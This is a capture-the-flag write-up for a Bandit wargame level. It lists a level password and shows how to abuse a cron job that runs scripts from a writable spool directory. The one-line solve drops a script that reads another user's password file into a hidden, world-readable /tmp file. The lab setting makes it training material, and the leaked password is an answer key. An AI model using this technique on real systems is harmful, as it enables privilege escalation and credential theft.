# username
bandit23
# password
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
# objective
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
# method of solve
This is the same setup as the previous two levels:
```
cat /usr/bin/cronjob_bandit24.sh
```
We need to create a script in the specified directory. It will be executed as the bandit24 user:
```
echo 'cat /etc/bandit_pass/bandit24 > /tmp/...shyhat_bandit24_pass.txt; chmod 777 /tmp/...shyhat_bandit24_pass.txt' > /var/spool/bandit24/foo/shyhat.sh; chmod +x /var/spool/bandit24/foo/shyhat.sh
```
Then we read the file for the password
```
cat /tmp/...shyhat_bandit24_pass.txt
```
